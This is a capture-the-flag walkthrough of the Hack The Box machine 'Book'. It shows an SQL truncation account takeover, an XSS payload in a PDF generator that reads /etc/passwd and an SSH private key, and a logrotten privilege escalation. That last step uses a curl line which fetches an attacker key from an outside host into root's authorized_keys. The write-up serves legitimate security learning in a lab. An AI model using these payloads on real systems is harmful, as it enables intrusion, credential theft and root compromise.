---
title: "Book - HackThebox"
date: 2020-04-20T02:15:50+02:00
tags: [HackTheBox, logrotate, pdf-generator, arbitrary-file-read, logrotten]
---

Book is a medium difficulty Linux machine on Hack The Box in which we'll take
advantage of PDF generator in order to read an arbitrary file and exploit
`logrotate` to escalate to root.

## Information gathering

Let's run a quick port scan:
```
$ nmap -A -T4 10.10.10.176

Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-19 20:16 EDT
Nmap scan report for 10.10.10.176
Host is up (0.078s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The only accessible thing is the HTTP server on port 80, so let's visit it:
![](/images/hackthebox/book/web.png)

As we can register, let's do it and login:
![](/images/hackthebox/book/library.png)

## Exploring the website

It's a library website, one thing that may be useful later is a mail found in
the *Contact Us* page:
![](/images/hackthebox/book/contact.png)

Another interesting functionality is an upload in the Collections section that
allows us to upload a new book to the library:
![](/images/hackthebox/book/submission.png)

After uploading a `.pdf` file, this is the result:
![](/images/hackthebox/book/upload.png)

## Further exploration

Let's run a quick discovery with `ffuf`:
```
$ ffuf -c -r -ac -w /usr/share/wordlists/raft-large.txt -u http://10.10.10.176/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.176/FUZZ
 :: Follow redirects : true
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 277
 :: Filter           : Response words: 20
 :: Filter           : Response lines: 10
________________________________________________

admin                   [Status: 200, Size: 6291, Words: 377, Lines: 308]
index.php               [Status: 200, Size: 6800, Words: 461, Lines: 322]
search.php              [Status: 200, Size: 6800, Words: 461, Lines: 322]
profile.php             [Status: 200, Size: 6800, Words: 461, Lines: 322]
download.php            [Status: 200, Size: 6800, Words: 461, Lines: 322]
home.php                [Status: 200, Size: 6800, Words: 461, Lines: 322]
contact.php             [Status: 200, Size: 6800, Words: 461, Lines: 322]
logout.php              [Status: 200, Size: 6800, Words: 461, Lines: 322]
feedback.php            [Status: 200, Size: 6800, Words: 461, Lines: 322]
.                       [Status: 200, Size: 6800, Words: 461, Lines: 322]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
settings.php            [Status: 200, Size: 6800, Words: 461, Lines: 322]
books.php               [Status: 200, Size: 6800, Words: 461, Lines: 322]
collections.php         [Status: 200, Size: 6800, Words: 461, Lines: 322]
admin                   [Status: 200, Size: 6291, Words: 377, Lines: 308]
.                       [Status: 200, Size: 6800, Words: 461, Lines: 322]
```

`/admin` is another login.


## Truncation attack

While doing some common enumeration stuff, I noticed something interesting. I've
registered an account using a long mail address, and the login suddenly wouldn't
work. Some in depth fuzzing allowed me to discover that there's a mail length
limit of 20 characters, so if we register with `abcdefghijklmnopqrst@mail.com`,
the `@mail.com` part will be omitted.  Probabily the backend uses the `TRUNCATE`
SQL function.

This is a serious problem because we can register using `admin@book.htb
foo` as mail and `foo` will be truncated and the remaining spaces will be
trimmed.

Let's fire up burp and, after intercepting the registration request, let's
modify it like this:
![](/images/hackthebox/book/registration.png)

And now we can login to `/admin` using `admin@book.htb` as mail and `admin` as
password:
![](/images/hackthebox/book/admin.png)

The admin panel allows us to export the list of users and the list of
collections as a PDF:
![](/images/hackthebox/book/collections-export.png)

And this will be the exported PDF:
![](/images/hackthebox/book/exported-collections.png)

I was doing some testing and when I tried to use `<h1>Bold test</h1>` as the
book title in the user section of the website, this is the resulting exported
Collections PDF from the admin section:
![](/images/hackthebox/book/bold-collections.png)

Great! Let's see how we can exploit this!
[Here's](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
an article that helped me a lot.

Let's try to use this payload as title in the user section:
```
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script> 
```

And let's export the Collections PDF from the admin section:
![](/images/hackthebox/book/passwd.png)

We can see that there's a user called `reader`. Let's try the same thing but for
`/home/reader/.ssh/id_rsa` instead of `/etc/passwd`:
![](/images/hackthebox/book/ssh-key.png)

The only problem here is that it's not so easy to copy and paste, as long lines
are overflowing outside of the PDF. Luckily there's a handy script that can help
us called
[pdf2txt.py](https://github.com/euske/pdfminer/blob/master/tools/pdf2txt.py).

So let's run `pdf2txt.py 36801.pdf > id_rsa`, and after replacing tabs with
spaces we can try to login in as `reader` using the RSA key:

```
$ ssh -i id_rsa reader@10.10.10.176
The authenticity of host '10.10.10.176 (10.10.10.176)' can't be established.
ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9/eAeT/9wUfoQQk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.176' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul 13 19:05:03 UTC 2020

  System load:  0.11               Processes:            148
  Usage of /:   26.5% of 19.56GB   Users logged in:      1
  Memory usage: 22%                IP address for ens33: 10.10.10.176
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

114 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan 29 13:03:06 2020 from 10.10.14.3
reader@book:~$
```

And we're in! Let's see if we can read the user flag:
```
reader@book:~$ wc -c user.txt
33 user.txt
```

## Privilege escalation

Running the `linpeas.sh` enumeration script on the machine, we notice an
interesting entry:
```
[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
Writable: /home/reader/backups/access.log
```

The vulnerability that affects `logrotate` is a race condition, in which we are
able to write to any file that the `logrotate` process has the permission to,
and it is explained
[here](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
really well.

We will use it to write out mailicious payload to `/etc/bash_completion.d`,
which contains some scripts that `bash` runs upon any login.

Let's download and compile the `logrotten` exploit:
```
$ git clone https://github.com/whotwagner/logrotten && cd logrotten
Cloning into 'logrotten'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 87 (delta 0), reused 1 (delta 0), pack-reused 84
Unpacking objects: 100% (87/87), 416.19 KiB | 1.07 MiB/s, done.
$ gcc -o logrotten logrotten.c
```

To copy it on the machine, we can start a HTTP server with `python3 -m
http.server 1337` on our machine and download it on the remote machine with
`wget http://10.10.14.81:1337/logrotten`.

After generating a key with `ssh-keygen` on our machine, let's save on the
remote machine the payload that will download it and add it to the authorized
keys of root:
```
#!/bin/bash
curl http://10.10.14.81:1337/id_rsa.pub >> /root/.ssh/authorized_keys
```

Let's run the exploit:
```
reader@book:~$ ./logrotten -p ./payload backups/access.log
Waiting for rotating backups/access.log...
```

We now have to trigger the log rotation. We can do something like `echo test >> ~/backups/access.log` until we see this message from `logrotten`:
```
Renamed backups with backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```

As soon as we see the connection on our HTTP server we know that the payload has
been executed, so let's connect with ssh:
```
root@book:~# wc -c root.txt
33 root.txt
```

And here we go! Thanks for reading!
